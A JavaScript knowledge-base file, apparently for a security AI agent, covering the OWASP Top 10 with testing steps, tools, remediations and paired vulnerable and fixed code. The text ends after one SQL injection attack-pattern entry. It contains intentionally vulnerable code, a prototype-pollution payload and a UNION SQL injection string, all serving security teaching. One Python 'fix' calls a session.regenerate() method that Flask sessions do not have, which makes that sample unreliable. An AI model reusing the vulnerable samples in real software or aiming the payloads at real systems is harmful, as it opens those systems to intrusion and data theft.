"use strict";

// =============================================================================
// security-kb.js -- Comprehensive Security Knowledge Base for Nexus AI Agent
// =============================================================================
// Structured security knowledge covering OWASP Top 10, attack patterns,
// vulnerability types, pentest methodology, privilege escalation, reverse
// shells, default credentials, security headers, and port vulnerabilities.
// =============================================================================

// ---------------------------------------------------------------------------
// 1. OWASP TOP 10 (2021)
// ---------------------------------------------------------------------------

const OWASP_TOP_10 = [
  {
    id: "A01",
    name: "Broken Access Control",
    description:
      "Access control enforces policy such that users cannot act outside their intended permissions. " +
      "Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing business functions outside the user's limits. " +
      "Common vulnerabilities include violation of the principle of least privilege, bypassing access control checks by modifying the URL, internal application state, or HTML page, and permitting viewing or editing someone else's account by providing its unique identifier (insecure direct object references).",
    testingSteps: [
      "Enumerate all endpoints and map required roles/permissions for each",
      "Attempt horizontal privilege escalation by modifying user IDs in requests",
      "Attempt vertical privilege escalation by accessing admin endpoints as regular user",
      "Test IDOR vulnerabilities by iterating through object references (IDs, filenames)",
      "Verify that CORS policy is properly restrictive and does not allow wildcard origins",
      "Check for missing function-level access controls on API endpoints",
      "Test directory traversal by manipulating file path parameters",
      "Verify that JWT tokens are validated server-side and cannot be tampered with",
      "Check if forced browsing to authenticated pages works without authentication",
      "Test for privilege escalation via parameter tampering (role=admin, isAdmin=true)",
      "Verify rate limiting on sensitive endpoints to prevent enumeration",
      "Check if metadata manipulation (cookies, hidden fields, JWT) bypasses controls"
    ],
    tools: [
      "Burp Suite",
      "OWASP ZAP",
      "Postman",
      "curl",
      "Autorize (Burp extension)",
      "ffuf",
      "wfuzz"
    ],
    remediations: [
      "Implement access control mechanisms centrally and reuse them throughout the application",
      "Deny access by default except for public resources",
      "Implement access control checks on every request, not just on the UI",
      "Enforce record ownership rather than accepting that the user can create, read, update, or delete any record",
      "Disable web server directory listing and ensure file metadata and backup files are not present in web roots",
      "Log access control failures and alert administrators when appropriate",
      "Rate limit API and controller access to minimize the harm from automated attack tooling",
      "Invalidate stateful session identifiers on the server after logout"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: No ownership check
app.get('/api/users/:id/profile', async (req, res) => {
  const profile = await db.getUserProfile(req.params.id);
  res.json(profile);
});`,
        python: `# Vulnerable: No ownership check
@app.route('/api/users/<int:user_id>/profile')
def get_profile(user_id):
    profile = db.get_user_profile(user_id)
    return jsonify(profile)`
      },
      fixed: {
        js: `// Fixed: Ownership verification
app.get('/api/users/:id/profile', authenticate, async (req, res) => {
  if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const profile = await db.getUserProfile(req.params.id);
  res.json(profile);
});`,
        python: `# Fixed: Ownership verification
@app.route('/api/users/<int:user_id>/profile')
@login_required
def get_profile(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)
    profile = db.get_user_profile(user_id)
    return jsonify(profile)`
      }
    }
  },
  {
    id: "A02",
    name: "Cryptographic Failures",
    description:
      "Previously known as Sensitive Data Exposure, this category focuses on failures related to cryptography which often lead to exposure of sensitive data. " +
      "Common issues include transmitting data in clear text (HTTP, SMTP, FTP), using old or weak cryptographic algorithms, using default crypto keys, not enforcing encryption, and not validating server certificates. " +
      "Determining the protection needs of data in transit and at rest is essential, with special attention to passwords, credit card numbers, health records, personal information, and business secrets.",
    testingSteps: [
      "Identify all sensitive data transmitted or stored by the application",
      "Check if any data is transmitted in clear text (HTTP, SMTP without STARTTLS)",
      "Verify that TLS is enforced with strong cipher suites and proper certificate validation",
      "Check for use of deprecated algorithms (MD5, SHA1, DES, RC4, etc.)",
      "Test for weak or default encryption keys in configuration files",
      "Verify that passwords are stored with strong adaptive hashing (bcrypt, scrypt, Argon2)",
      "Check if sensitive data is cached or stored in browser localStorage/sessionStorage",
      "Test SSL/TLS configuration with sslyze, testssl.sh, or SSL Labs",
      "Verify that initialization vectors are not static or predictable",
      "Check for proper key management and rotation procedures",
      "Test for information disclosure in error messages related to crypto operations",
      "Verify HSTS header is set with appropriate max-age"
    ],
    tools: [
      "sslyze",
      "testssl.sh",
      "nmap --script ssl-enum-ciphers",
      "Qualys SSL Labs",
      "HashID",
      "John the Ripper",
      "Hashcat"
    ],
    remediations: [
      "Classify data processed, stored, or transmitted and identify which is sensitive according to regulations",
      "Do not store sensitive data unnecessarily; discard it as soon as possible",
      "Encrypt all sensitive data at rest using strong, current algorithms (AES-256-GCM)",
      "Enforce encryption in transit with TLS 1.2+ and HSTS headers",
      "Use authenticated encryption instead of just encryption where possible",
      "Store passwords using strong adaptive and salted hashing functions (Argon2id, bcrypt, scrypt)",
      "Generate cryptographic keys using secure random number generators",
      "Disable caching for responses that contain sensitive data"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: MD5 for password hashing
const crypto = require('crypto');
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}`,
        python: `# Vulnerable: MD5 for password hashing
import hashlib
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()`
      },
      fixed: {
        js: `// Fixed: bcrypt for password hashing
const bcrypt = require('bcrypt');
async function hashPassword(password) {
  const salt = await bcrypt.genSalt(12);
  return bcrypt.hash(password, salt);
}
async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}`,
        python: `# Fixed: bcrypt for password hashing
import bcrypt
def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)
def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)`
      }
    }
  },
  {
    id: "A03",
    name: "Injection",
    description:
      "An application is vulnerable to injection when user-supplied data is not validated, filtered, or sanitized by the application, or when dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter. " +
      "Some of the more common injections are SQL, NoSQL, OS command, ORM, LDAP, and Expression Language or OGNL injection. " +
      "Source code review is the best method of detecting if applications are vulnerable to injections, closely followed by thorough automated testing of all parameters, headers, URL, cookies, JSON, SOAP, and XML data inputs.",
    testingSteps: [
      "Map all user input points including parameters, headers, cookies, and file uploads",
      "Test each input point with SQL injection payloads (single quotes, UNION, boolean-based)",
      "Test for blind SQL injection using time-based techniques (SLEEP, BENCHMARK)",
      "Test for NoSQL injection with MongoDB operators ($gt, $ne, $regex)",
      "Test for OS command injection using shell metacharacters (;, |, &&, ||, backticks)",
      "Test for LDAP injection with special characters (*, (, ), \\, NUL)",
      "Test for XML injection and XXE with DTD entity declarations",
      "Test for Server-Side Template Injection (SSTI) with template syntax ({{, ${, <%)",
      "Test for expression language injection in Java-based applications",
      "Verify that parameterized queries are used for all database interactions",
      "Check for stored procedure injection vulnerabilities",
      "Test for second-order injection where payload is stored and executed later"
    ],
    tools: [
      "SQLMap",
      "NoSQLMap",
      "Commix",
      "Burp Suite",
      "OWASP ZAP",
      "tplmap",
      "Ghauri"
    ],
    remediations: [
      "Use parameterized queries (prepared statements) for all database queries",
      "Use ORM frameworks with parameterized queries rather than raw SQL",
      "Validate and sanitize all user input using server-side allowlist validation",
      "Escape special characters for the specific interpreter being used",
      "Use LIMIT and other SQL controls within queries to prevent mass disclosure of records",
      "Implement least privilege database accounts that cannot access other schemas",
      "Use stored procedures but ensure they are also parameterized",
      "Apply input length limits and data type validation on all inputs"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: String concatenation in SQL query
app.get('/api/users', async (req, res) => {
  const query = "SELECT * FROM users WHERE name = '" + req.query.name + "'";
  const results = await db.query(query);
  res.json(results);
});`,
        python: `# Vulnerable: String formatting in SQL query
@app.route('/api/users')
def get_users():
    name = request.args.get('name')
    cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)
    return jsonify(cursor.fetchall())`
      },
      fixed: {
        js: `// Fixed: Parameterized query
app.get('/api/users', async (req, res) => {
  const query = "SELECT * FROM users WHERE name = $1";
  const results = await db.query(query, [req.query.name]);
  res.json(results);
});`,
        python: `# Fixed: Parameterized query
@app.route('/api/users')
def get_users():
    name = request.args.get('name')
    cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
    return jsonify(cursor.fetchall())`
      }
    }
  },
  {
    id: "A04",
    name: "Insecure Design",
    description:
      "Insecure design is a broad category representing different weaknesses expressed as missing or ineffective control design. " +
      "It is differentiated from insecure implementation because there are different root causes and remediation approaches; a secure design can still have implementation defects leading to vulnerabilities, but an insecure design cannot be fixed by a perfect implementation. " +
      "Threat modeling, secure design patterns, and reference architectures are needed to protect against insecure design flaws, including inadequate business logic controls, missing rate limiting, and failure to segregate tenants in multi-tenant systems.",
    testingSteps: [
      "Review the application architecture for missing security controls",
      "Verify that threat modeling has been performed for critical workflows",
      "Check for missing rate limiting on authentication and sensitive operations",
      "Test business logic flaws by manipulating workflow sequences",
      "Verify that error handling does not reveal sensitive information",
      "Check for missing input validation at the design level",
      "Test for race conditions in critical operations (TOCTOU)",
      "Verify that the principle of defense in depth is applied",
      "Check for missing security controls in data flow between trust boundaries",
      "Test for missing anti-automation controls on public-facing forms",
      "Verify that multi-tenant isolation is properly implemented",
      "Check if security requirements and user stories are defined for the application"
    ],
    tools: [
      "Threat Dragon (OWASP)",
      "Microsoft Threat Modeling Tool",
      "Burp Suite",
      "OWASP ZAP",
      "draw.io",
      "PlantUML"
    ],
    remediations: [
      "Establish and use a secure development lifecycle with AppSec professionals",
      "Use threat modeling for critical authentication, access control, and business logic flows",
      "Integrate security language and controls into user stories",
      "Write unit and integration tests to validate critical security flows",
      "Segregate tier layers on the system and network layers depending on exposure and protection needs",
      "Design for tenancy segregation at all tiers",
      "Limit resource consumption by user or service",
      "Establish a library of secure design patterns or paved road components"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: No rate limiting on login
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.findUser(username);
  if (user && await bcrypt.compare(password, user.password)) {
    return res.json({ token: generateToken(user) });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});`,
        python: `# Vulnerable: No rate limiting on login
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    user = db.find_user(username)
    if user and check_password(password, user.password):
        return jsonify({'token': generate_token(user)})
    return jsonify({'error': 'Invalid credentials'}), 401`
      },
      fixed: {
        js: `// Fixed: Rate limiting and account lockout
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });

app.post('/api/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;
  const user = await db.findUser(username);
  if (!user || user.lockedUntil > Date.now()) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  if (await bcrypt.compare(password, user.password)) {
    await db.resetFailedAttempts(username);
    return res.json({ token: generateToken(user) });
  }
  await db.incrementFailedAttempts(username);
  res.status(401).json({ error: 'Invalid credentials' });
});`,
        python: `# Fixed: Rate limiting and account lockout
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["200 per day"])

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per 15 minutes")
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    user = db.find_user(username)
    if not user or user.locked_until > datetime.utcnow():
        return jsonify({'error': 'Invalid credentials'}), 401
    if check_password(password, user.password):
        db.reset_failed_attempts(username)
        return jsonify({'token': generate_token(user)})
    db.increment_failed_attempts(username)
    return jsonify({'error': 'Invalid credentials'}), 401`
      }
    }
  },
  {
    id: "A05",
    name: "Security Misconfiguration",
    description:
      "The application might be vulnerable if it is missing appropriate security hardening across any part of the application stack, or if permissions on cloud services are improperly configured. " +
      "Unnecessary features are enabled or installed (ports, services, pages, accounts, privileges), default accounts and their passwords are still enabled and unchanged, and error handling reveals stack traces or other overly informative error messages to users. " +
      "For upgraded systems, the latest security features are disabled or not configured securely, and security settings in application servers, frameworks, libraries, and databases are not set to secure values.",
    testingSteps: [
      "Check for default credentials on all services and administrative interfaces",
      "Verify that unnecessary HTTP methods are disabled (TRACE, PUT, DELETE where not needed)",
      "Check for directory listing enabled on web servers",
      "Verify that error pages do not reveal stack traces or sensitive information",
      "Check for unnecessary open ports using nmap",
      "Verify that security headers are properly configured",
      "Check cloud storage permissions (S3 buckets, Azure blobs, GCS) for public access",
      "Test for CORS misconfiguration allowing unauthorized origins",
      "Verify that debug mode is disabled in production",
      "Check for outdated server software versions",
      "Verify that XML processing is configured to prevent XXE attacks",
      "Check for unnecessary services running on the server"
    ],
    tools: [
      "Nmap",
      "Nikto",
      "ScoutSuite",
      "Prowler",
      "Mozilla Observatory",
      "SecurityHeaders.com",
      "CloudSploit"
    ],
    remediations: [
      "Implement a repeatable hardening process that makes it fast and easy to deploy a properly locked-down environment",
      "Remove or do not install unused features and frameworks",
      "Review and update configurations as part of the patch management process",
      "Implement a segmented application architecture providing effective separation between components",
      "Send security directives to clients via security headers",
      "Automate the verification of configuration effectiveness in all environments",
      "Use different credentials for each environment",
      "Keep platforms, frameworks, and dependencies updated and patched"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: Detailed error messages in production
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    query: req.query,
    body: req.body
  });
});`,
        python: `# Vulnerable: Debug mode in production
app = Flask(__name__)
app.config['DEBUG'] = True
app.config['SECRET_KEY'] = 'default-secret-key'

@app.errorhandler(500)
def error_handler(e):
    return jsonify({'error': str(e), 'traceback': traceback.format_exc()}), 500`
      },
      fixed: {
        js: `// Fixed: Generic error messages in production
app.use((err, req, res, next) => {
  const errorId = crypto.randomUUID();
  logger.error({ errorId, err, path: req.path });
  res.status(500).json({
    error: 'An internal error occurred',
    referenceId: errorId
  });
});`,
        python: `# Fixed: Proper error handling for production
app = Flask(__name__)
app.config['DEBUG'] = False
app.config['SECRET_KEY'] = os.environ['SECRET_KEY']

@app.errorhandler(500)
def error_handler(e):
    error_id = str(uuid.uuid4())
    app.logger.error(f"Error {error_id}: {e}")
    return jsonify({'error': 'An internal error occurred', 'referenceId': error_id}), 500`
      }
    }
  },
  {
    id: "A06",
    name: "Vulnerable and Outdated Components",
    description:
      "Components such as libraries, frameworks, and other software modules run with the same privileges as the application, and if a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. " +
      "Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts, including running arbitrary code on the server. " +
      "Organizations should have a process to monitor, triage, and apply updates or configuration changes for the lifetime of the application or portfolio, and remove unused dependencies, unnecessary features, components, files, and documentation.",
    testingSteps: [
      "Inventory all components and their versions (both client-side and server-side)",
      "Check for known vulnerabilities using CVE databases (NVD, Snyk, GitHub Advisory)",
      "Verify that all components are actively maintained and not end-of-life",
      "Run dependency audit tools (npm audit, pip-audit, bundler-audit)",
      "Check for outdated JavaScript libraries in the frontend (retire.js)",
      "Verify that components are obtained from official sources over secure links",
      "Check for components with known security misconfigurations",
      "Test for vulnerabilities in transitive (indirect) dependencies",
      "Verify that a software bill of materials (SBOM) is maintained",
      "Check if there are automated alerts for new vulnerabilities in used components",
      "Test if the application gracefully handles component failures",
      "Verify that unnecessary components and dependencies have been removed"
    ],
    tools: [
      "npm audit",
      "Snyk",
      "OWASP Dependency-Check",
      "retire.js",
      "pip-audit",
      "Trivy",
      "Grype",
      "GitHub Dependabot"
    ],
    remediations: [
      "Remove unused dependencies, unnecessary features, components, files, and documentation",
      "Continuously inventory the versions of both client-side and server-side components and their dependencies",
      "Monitor CVE and NVD for vulnerabilities in components and subscribe to email alerts",
      "Only obtain components from official sources over secure links with signed packages",
      "Monitor for libraries and components that are unmaintained or do not create security patches",
      "Prefer using virtual patching to components that cannot be updated",
      "Ensure an ongoing plan to monitor, triage, and apply updates for the application lifetime",
      "Implement automated dependency scanning in the CI/CD pipeline"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: Using outdated lodash with prototype pollution
// package.json: "lodash": "4.17.15"
const _ = require('lodash');
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
_.merge({}, payload);
// All objects now have isAdmin === true`,
        python: `# Vulnerable: Using outdated PyYAML with code execution
# requirements.txt: PyYAML==5.1
import yaml
data = yaml.load(user_input)  # Allows arbitrary code execution`
      },
      fixed: {
        js: `// Fixed: Updated lodash + input validation
// package.json: "lodash": "4.17.21"
const _ = require('lodash');
function safeMerge(target, source) {
  const sanitized = JSON.parse(JSON.stringify(source));
  delete sanitized.__proto__;
  delete sanitized.constructor;
  return _.merge(target, sanitized);
}`,
        python: `# Fixed: Updated PyYAML with safe loading
# requirements.txt: PyYAML==6.0.1
import yaml
data = yaml.safe_load(user_input)  # Only allows basic Python types`
      }
    }
  },
  {
    id: "A07",
    name: "Identification and Authentication Failures",
    description:
      "Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. " +
      "There may be authentication weaknesses if the application permits automated attacks such as credential stuffing where the attacker has a list of valid usernames and passwords, permits brute force or other automated attacks, permits default, weak, or well-known passwords. " +
      "Weak session management can also be exploited, including reusing session IDs after successful login, not properly invalidating session tokens during logout, and exposing session identifiers in the URL.",
    testingSteps: [
      "Test for default credentials on all login interfaces",
      "Test for credential stuffing vulnerability (automated login attempts with known credential lists)",
      "Verify that password complexity requirements are enforced (min length 8+, mixed chars)",
      "Test for brute force protection on login forms",
      "Check if multi-factor authentication is available and properly implemented",
      "Verify that session tokens are rotated after successful authentication",
      "Test for session fixation vulnerabilities",
      "Check if sessions are properly invalidated on logout",
      "Verify that session IDs are not exposed in URLs",
      "Test password reset functionality for token predictability and expiration",
      "Check for user enumeration via login, registration, or password reset responses",
      "Verify that account lockout policies are in place and cannot be abused for DoS"
    ],
    tools: [
      "Hydra",
      "Medusa",
      "Burp Suite Intruder",
      "John the Ripper",
      "Hashcat",
      "CeWL",
      "Patator"
    ],
    remediations: [
      "Implement multi-factor authentication to prevent credential stuffing and brute force attacks",
      "Do not ship or deploy with default credentials, particularly for admin users",
      "Implement weak password checks against a list of the top 10,000 worst passwords",
      "Align password length, complexity, and rotation policies with NIST 800-63b guidelines",
      "Harden against account enumeration by using the same messages for all outcomes",
      "Limit or increasingly delay failed login attempts and log all failures",
      "Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login",
      "Ensure that session identifiers are not in the URL and are properly invalidated after logout"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: No session rotation, weak session management
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.username, req.body.password);
  if (user) {
    req.session.userId = user.id; // Session not regenerated
    res.json({ success: true });
  }
  res.status(401).json({ error: 'Wrong username or password' }); // Reveals both checked
});`,
        python: `# Vulnerable: Session not regenerated after login
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id  # Session not regenerated
        return jsonify({'success': True})
    return jsonify({'error': 'Wrong username or password'}), 401`
      },
      fixed: {
        js: `// Fixed: Session regeneration, generic error messages
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.username, req.body.password);
  if (user) {
    req.session.regenerate((err) => {
      if (err) return res.status(500).json({ error: 'Internal error' });
      req.session.userId = user.id;
      req.session.save(() => res.json({ success: true }));
    });
    return;
  }
  res.status(401).json({ error: 'Invalid credentials' }); // Generic message
});`,
        python: `# Fixed: Session regeneration, generic error messages
from flask import session
import secrets

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session.clear()
        session.regenerate()
        session['user_id'] = user.id
        session['csrf_token'] = secrets.token_hex(32)
        return jsonify({'success': True})
    return jsonify({'error': 'Invalid credentials'}), 401`
      }
    }
  },
  {
    id: "A08",
    name: "Software and Data Integrity Failures",
    description:
      "Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations, such as using software updates without verifying signatures, plugins or libraries from untrusted sources, or insecure CI/CD pipelines. " +
      "An insecure CI/CD pipeline can introduce the potential for unauthorized access, malicious code, or system compromise, and many applications now include auto-update functionality where updates are downloaded without sufficient integrity verification. " +
      "Insecure deserialization is another major issue, where applications deserialize hostile or tampered objects supplied by an attacker, leading to remote code execution or replay attacks.",
    testingSteps: [
      "Review the CI/CD pipeline for security controls and access restrictions",
      "Check if software updates are verified with digital signatures",
      "Test for insecure deserialization with crafted serialized objects",
      "Verify that dependency integrity is checked (lock files, SRI hashes)",
      "Check if the application uses unsigned or unverified packages",
      "Test for object injection via deserialization of user-controlled data",
      "Verify that CI/CD pipelines have proper access controls and audit logging",
      "Check for use of eval() or similar functions on user-supplied data",
      "Verify that Subresource Integrity (SRI) is used for external scripts and styles",
      "Test for prototype pollution in JavaScript applications",
      "Check if serialized data is signed or encrypted before transmission",
      "Verify that the application does not deserialize data from untrusted sources"
    ],
    tools: [
      "ysoserial",
      "Java Deserialization Scanner (Burp extension)",
      "npm audit signatures",
      "Sigstore/cosign",
      "in-toto",
      "SLSA framework tools"
    ],
    remediations: [
      "Use digital signatures or similar mechanisms to verify software or data is from the expected source",
      "Ensure libraries and dependencies are consuming trusted repositories",
      "Use a software supply chain security tool such as OWASP Dependency-Check or CycloneDX",
      "Ensure that CI/CD pipelines have proper segregation, configuration, and access control",
      "Do not send serialized data to untrusted clients without some form of integrity check or digital signature",
      "Ensure that unsigned or unencrypted serialized data is not sent to untrusted clients",
      "Implement integrity checks such as digests on any serialized objects to prevent data tampering",
      "Use Subresource Integrity (SRI) for all external JavaScript and CSS resources"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: Unsafe deserialization
const serialize = require('node-serialize');
app.post('/api/session', (req, res) => {
  const session = serialize.unserialize(req.cookies.session); // RCE possible
  res.json(session);
});`,
        python: `# Vulnerable: Pickle deserialization of untrusted data
import pickle, base64

@app.route('/api/session', methods=['POST'])
def load_session():
    data = base64.b64decode(request.cookies.get('session'))
    session = pickle.loads(data)  # Arbitrary code execution
    return jsonify(session)`
      },
      fixed: {
        js: `// Fixed: Use JSON with signature verification
const jwt = require('jsonwebtoken');
app.post('/api/session', (req, res) => {
  try {
    const session = jwt.verify(req.cookies.session, process.env.JWT_SECRET);
    res.json(session);
  } catch (err) {
    res.status(401).json({ error: 'Invalid session' });
  }
});`,
        python: `# Fixed: Use JSON with HMAC verification
import json, hmac, hashlib

@app.route('/api/session', methods=['POST'])
def load_session():
    data = request.cookies.get('session')
    signature = request.cookies.get('session_sig')
    expected_sig = hmac.new(
        app.config['SECRET_KEY'].encode(), data.encode(), hashlib.sha256
    ).hexdigest()
    if not hmac.compare_digest(signature, expected_sig):
        return jsonify({'error': 'Invalid session'}), 401
    session = json.loads(data)
    return jsonify(session)`
      }
    }
  },
  {
    id: "A09",
    name: "Security Logging and Monitoring Failures",
    description:
      "Without logging and monitoring, breaches cannot be detected, and the average time to identify a breach is over 200 days, typically detected by external parties rather than internal processes. " +
      "Insufficient logging, detection, monitoring, and active response occurs when auditable events such as logins, failed logins, and high-value transactions are not logged, or when warnings and errors generate no or inadequate log messages. " +
      "Applications and APIs should be monitored and alerted so that suspicious activity is detected and responded to quickly, and penetration testing and scans by DAST tools should trigger alerts.",
    testingSteps: [
      "Verify that all authentication events (success and failure) are logged",
      "Check that access control failures are logged with sufficient context",
      "Verify that input validation failures are logged",
      "Check that logs include enough context (who, what, when, where) for forensics",
      "Verify that logs are stored securely and cannot be tampered with",
      "Check that log injection is prevented by sanitizing log outputs",
      "Verify that monitoring and alerting systems are in place for suspicious activity",
      "Test if security scanning tools trigger alerts in the monitoring system",
      "Check that logs are centralized and aggregated from all application instances",
      "Verify that log retention policies are in place and comply with regulations",
      "Check if there are incident response procedures documented and tested",
      "Verify that high-value transactions have an audit trail with integrity controls"
    ],
    tools: [
      "ELK Stack (Elasticsearch, Logstash, Kibana)",
      "Splunk",
      "Graylog",
      "OSSEC",
      "Wazuh",
      "Syslog-ng",
      "Prometheus + Grafana"
    ],
    remediations: [
      "Ensure all login, access control, and server-side input validation failures are logged with sufficient user context",
      "Ensure logs are generated in a format easily consumed by centralized log management solutions",
      "Ensure high-value transactions have an audit trail with integrity controls to prevent tampering or deletion",
      "Establish or adopt an incident response and recovery plan",
      "Ensure that log data is encoded correctly to prevent injections or attacks on monitoring systems",
      "Implement automated alerting for suspicious activities",
      "Use tamper-evident or append-only storage for critical log files",
      "DevSecOps teams should establish effective monitoring and alerting to detect suspicious activities quickly"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: No logging of security events
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.username, req.body.password);
  if (user) {
    req.session.userId = user.id;
    return res.json({ success: true });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});`,
        python: `# Vulnerable: No logging of security events
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id
        return jsonify({'success': True})
    return jsonify({'error': 'Invalid credentials'}), 401`
      },
      fixed: {
        js: `// Fixed: Comprehensive security event logging
const logger = require('./logger');
app.post('/login', async (req, res) => {
  const { username } = req.body;
  const user = await authenticate(username, req.body.password);
  if (user) {
    logger.info('auth.login.success', {
      userId: user.id, ip: req.ip, userAgent: req.headers['user-agent']
    });
    req.session.userId = user.id;
    return res.json({ success: true });
  }
  logger.warn('auth.login.failure', {
    username, ip: req.ip, userAgent: req.headers['user-agent']
  });
  res.status(401).json({ error: 'Invalid credentials' });
});`,
        python: `# Fixed: Comprehensive security event logging
import logging
security_logger = logging.getLogger('security')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    user = authenticate(username, request.form['password'])
    if user:
        security_logger.info('auth.login.success', extra={
            'user_id': user.id, 'ip': request.remote_addr,
            'user_agent': request.user_agent.string
        })
        session['user_id'] = user.id
        return jsonify({'success': True})
    security_logger.warning('auth.login.failure', extra={
        'username': username, 'ip': request.remote_addr,
        'user_agent': request.user_agent.string
    })
    return jsonify({'error': 'Invalid credentials'}), 401`
      }
    }
  },
  {
    id: "A10",
    name: "Server-Side Request Forgery (SSRF)",
    description:
      "SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL, allowing an attacker to coerce the application to send a crafted request to an unexpected destination. " +
      "With the growing prevalence of cloud services and the complexity of architectures, the severity of SSRF is increasing as attackers use SSRF to access internal services behind firewalls, enumerate internal networks, and read cloud metadata endpoints. " +
      "Even with proper URL validation, modern applications with functionalities like webhooks, file imports from URLs, custom SSO integrations, and URL previews create new SSRF attack surfaces.",
    testingSteps: [
      "Identify all functionality that accepts URLs or makes server-side HTTP requests",
      "Test with internal IP addresses (127.0.0.1, 10.x.x.x, 172.16.x.x, 192.168.x.x)",
      "Test with cloud metadata URLs (169.254.169.254, metadata.google.internal)",
      "Test URL redirection to internal resources (open redirect to SSRF chain)",
      "Test with alternative IP representations (decimal, hex, octal, IPv6)",
      "Test with DNS rebinding techniques to bypass validation",
      "Check if the application follows redirects and if this can be abused",
      "Test file:// protocol handler for local file read",
      "Test other protocol handlers (gopher://, dict://, ftp://)",
      "Verify that responses from internal services are not returned to the user",
      "Check for blind SSRF using out-of-band detection (DNS, HTTP callbacks)",
      "Test webhook and callback URL functionality for SSRF"
    ],
    tools: [
      "Burp Suite Collaborator",
      "SSRFmap",
      "Gopherus",
      "interactsh",
      "curl",
      "ffuf",
      "nuclei"
    ],
    remediations: [
      "Sanitize and validate all client-supplied input data including URLs",
      "Enforce URL schema, port, and destination with a positive allowlist",
      "Do not send raw responses to clients; validate the response before returning it",
      "Disable HTTP redirections or validate the redirect destination",
      "Use network-level controls (firewall rules, network segmentation) to block SSRF",
      "Implement a deny-by-default firewall policy for internal network access",
      "For dedicated functionality like webhooks, use an allowlist of permitted IPs or domains",
      "Block access to cloud instance metadata endpoints (169.254.169.254)"
    ],
    codeExamples: {
      vulnerable: {
        js: `// Vulnerable: No URL validation for server-side fetch
app.post('/api/fetch-url', async (req, res) => {
  const response = await fetch(req.body.url);
  const data = await response.text();
  res.json({ content: data });
});`,
        python: `# Vulnerable: No URL validation for server-side fetch
@app.route('/api/fetch-url', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    response = requests.get(url)
    return jsonify({'content': response.text})`
      },
      fixed: {
        js: `// Fixed: URL validation with allowlist
const { URL } = require('url');
const ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];

app.post('/api/fetch-url', async (req, res) => {
  try {
    const parsed = new URL(req.body.url);
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return res.status(400).json({ error: 'Invalid protocol' });
    }
    if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
      return res.status(400).json({ error: 'Domain not allowed' });
    }
    const response = await fetch(parsed.href, { redirect: 'error' });
    const data = await response.text();
    res.json({ content: data });
  } catch (err) {
    res.status(400).json({ error: 'Invalid URL' });
  }
});`,
        python: `# Fixed: URL validation with allowlist
from urllib.parse import urlparse
ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

@app.route('/api/fetch-url', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return jsonify({'error': 'Invalid protocol'}), 400
    if parsed.hostname not in ALLOWED_DOMAINS:
        return jsonify({'error': 'Domain not allowed'}), 400
    response = requests.get(url, allow_redirects=False, timeout=5)
    return jsonify({'content': response.text})`
      }
    }
  }
];

// ---------------------------------------------------------------------------
// 2. ATTACK PATTERNS (100+ categorized attack patterns)
// ---------------------------------------------------------------------------

const ATTACK_PATTERNS = [
  // -- SQL Injection variants --
  { name: "Union-Based SQL Injection", category: "Injection", description: "Uses UNION SELECT to extract data from other tables by appending results to the original query", payload: "' UNION SELECT username, password FROM users--", prevention: "Use parameterized queries and stored procedures" },
